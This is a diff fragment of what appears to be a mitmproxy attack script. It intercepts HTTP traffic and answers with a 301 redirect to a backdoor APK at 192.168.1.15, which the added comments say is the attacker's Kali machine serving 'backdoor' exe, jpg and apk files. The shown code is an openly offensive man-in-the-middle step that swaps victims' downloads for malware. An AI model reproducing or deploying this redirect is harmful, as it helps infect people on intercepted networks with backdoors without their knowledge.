@@ -11,7 +11,8 @@ def request(flow):
 		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://192.168.1.15/backdoor/install.apk"})
 		
 		
-		
+		#flow.request.host kali ip address example ifconfig 
+		#Created backdoor Apache2 Files , exe,jpg,jpeg,apk
 		#1-HTTP STATUS 301
 		#2-İçerik
 		#3-Dosyanın Konumu
